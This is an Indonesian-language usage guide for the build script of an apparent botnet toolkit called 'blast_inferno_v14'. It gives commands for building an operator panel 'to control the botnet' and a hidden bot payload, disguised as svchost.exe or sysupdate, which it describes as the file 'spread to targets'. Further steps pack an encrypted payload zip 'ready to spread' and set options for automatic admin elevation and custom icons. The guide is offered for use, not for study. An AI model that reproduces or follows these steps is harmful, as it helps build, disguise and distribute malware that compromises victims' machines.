Cara pake setup.py:

1. Install semua dependency:

```bash
python3 setup.py install
```

Ini auto-install: aiohttp, aiohttp_socks, cryptography, brotli, scapy, playwright, paramiko, pyinstaller, dll.

2. Build Operator Panel EXE:

```bash
python3 setup.py build-operator
```

Output: dist/SystemUpdate.exe (Windows) atau dist/system_update (Linux)

· Console: ON (biar panel interaktif keliatan)
· Lo pake ini buat ngontrol botnet

3. Build Bot Payload EXE:

```bash
python3 setup.py build-bot
```

Output: dist/svchost.exe (Windows) atau dist/sysupdate (Linux)

· Console: OFF (hidden, jalan di background)
· Ini yang lo sebar ke target

4. Build semua:

```bash
python3 setup.py build-all
```

Output: dua-duanya.

5. Pack encrypted payload:

```bash
python3 setup.py pack
```

Output: dist/payload_encrypted.zip — payload terenkripsi siap sebar.

6. Bersihin build files:

```bash
python3 setup.py clean
```

---

Struktur folder setelah build:

```
blast_inferno_v14/
├── blast_inferno.py      # Main script
├── setup.py               # Setup/build script
├── dist/                  # Output EXE/binary
│   ├── SystemUpdate.exe   # Operator panel
│   ├── svchost.exe        # Bot payload
│   └── payload_encrypted.zip  # Payload terenkripsi
└── build/                 # Temporary build files
```

Custom config (ubah di CONFIG dict):

· icon_file: path ke .ico buat icon EXE
· console: True (keliatan) atau False (hidden)
· onefile: True (single EXE) atau False (folder)
· uac_admin: True kalo mau auto-request admin
